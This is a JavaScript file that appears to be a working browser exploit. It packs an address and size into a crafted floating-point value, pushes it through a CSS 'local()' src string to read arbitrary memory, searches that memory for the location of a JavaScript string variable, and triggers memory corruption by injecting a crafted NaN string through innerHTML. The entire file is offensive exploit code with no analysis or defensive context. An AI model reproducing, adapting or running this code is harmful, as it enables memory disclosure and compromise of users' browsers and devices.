Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length== 1) return data[0]; 
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign + '0.';
        while(mag++) z += '0';
        return z + str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) z += '0';
    return str + z;
}
function fromIEEE754(bytes, ebits, fbits)
{
	var retNumber = 0;
	var bits = [];
	for (var i = bytes.length; i; i -= 1)
	{
		var byte = bytes[i - 1];
		for (var j = 8; j; j -= 1)
		{
			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
		}
	}
	bits.reverse();
	var str = bits.join('');
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	if (e === (1 << ebits) - 1)
	{
		retNumber = f !== 0 ? NaN : s * Infinity;
	}
	else if (e > 0)
	{
		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	}
	else if (f !== 0)
	{
		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	}
	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}
function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}

function readMemory(exploit, address, size)
{
	var str = "local(" + generateExploit(address, size) + ")";
	exploit.style.src = str;
	return exploit.style.src;
}

function findJsVariableOffset(name,exploit_data,search_base,search_size,pattern,len,used_offsets,_log_div)
{
	try
	{
		var dat=readMemory(document.getElementById('exploit'),search_base,search_size).substr(6,search_size);
		for (var i=0;i<(search_size*2);i+=0x10)	{
			if (dat.charCodeAt(i/2)==pattern)
			{
				var match=0;
				for (var k=0;k<(len*2);k+=0x2)
				{
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					match+=1;
				}
				if (match==len)
				{
					var exploit_addr=search_base+i+2;
					logAdd("Found "+name+" at: 0x"+exploit_addr.toString(16),_log_div);	
					var cont=0;
					if(used_offsets.length>0)
					{
						for(var idx=0;idx<used_offsets.length;idx++)
						{
							if(used_offsets[idx]==exploit_addr)
							{
								cont=1;
								break;
							}
						}
						if(cont==1)
						{
							logAdd("0x"+exploit_addr.toString(16)+" is ignored.", _log_div);
							cont=0;
							continue;
						}
					}
					used_offsets.push(exploit_addr);
					logAdd("0x"+exploit_addr.toString(16)+" was added to used_offsets array.", _log_div);
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		var end_range = search_base+search_size;
		logAdd("The string variable named "+name+" could not be located in range 0x"+search_base.toString(16)+" - 0x"+end_range.toString(16), _log_div);
		return 0;
	} 
	catch(e) 
	{
		logAdd(e, _log_div);
	}
}
function trigger(exploit_addr){
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}